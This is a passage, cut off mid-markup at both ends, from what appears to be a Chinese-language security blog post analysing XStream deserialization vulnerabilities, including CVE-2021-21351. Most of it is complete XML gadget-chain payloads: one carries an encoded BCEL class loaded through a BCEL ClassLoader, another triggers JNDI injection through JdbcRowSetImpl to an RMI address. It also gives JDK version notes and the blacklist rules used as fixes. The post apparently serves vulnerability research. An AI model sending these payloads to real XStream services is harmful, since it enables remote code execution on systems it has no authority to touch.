class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这个和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载，相应的将processorCL改为了com.sun.org.apache.bcel.internal.util.ClassLoader。</p><p>在8u60环境下同样遇到processorCL构造的问题，更新为Wh1t3p1g师傅构造BCEL的方式之后运行成功。具体可以参考LazyIterator 中的poc。</p><h3 id="黑名单：-5"><a href="#黑名单：-5" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><p>author: wh1t3p1g</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ol><li>低版本的jdk中没有__overrideDefaultParser，在8u121上测试失败，8u172上成功，8u251测试失败，原因是高版本jdk jndi注入受JEP290影响。</li></ol><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这个也是ysomap中的XercesValue payload。</p><p>触发点在IncrementalSAXSource_Xerces.parseSome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">parseSome</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> SAXException, IOException, IllegalAccessException,</span></span><br><span class="line"><span class="function">                                         java.lang.reflect.InvocationTargetException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="comment">// Take next parsing step, return false iff parsing complete:</span></span><br><span class="line">                <span class="keyword">if</span>(fConfigSetInput!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        Object ret=(Boolean)(fConfigParse.invoke(fPullParserConfig,parmsfalse));</span><br></pre></td></tr></table></figure><p>其中fConfigParse、fPullParserConfig、parmsfalse都可控</p><h3 id="黑名单：-6"><a href="#黑名单：-6" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h2><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ServiceLoader$LazyIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">service</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loader</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&quot;hashtable&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&quot;java.lang.ClassLoader&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&quot;../..&quot;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Object<span 